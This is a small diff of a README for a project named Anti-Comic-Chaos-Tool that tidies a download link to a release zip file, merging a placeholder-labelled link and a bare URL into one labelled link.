@@ -1,7 +1,6 @@
 # Anti-Comic-Chaos-Tool
 <br><br>
-<a href="https://github.com/ComixZ/Anti-Comic-Chaos-Tool/releases/download/v1.8.2026/acct.zip">xxx</a>
-https://github.com/ComixZ/Anti-Comic-Chaos-Tool/releases/download/v1.8.2026/acct.zip
+<a href="https://github.com/ComixZ/Anti-Comic-Chaos-Tool/releases/download/v1.8.2026/acct.zip">acct.zip v1.8.2026</a>
 <br><br>
 
 
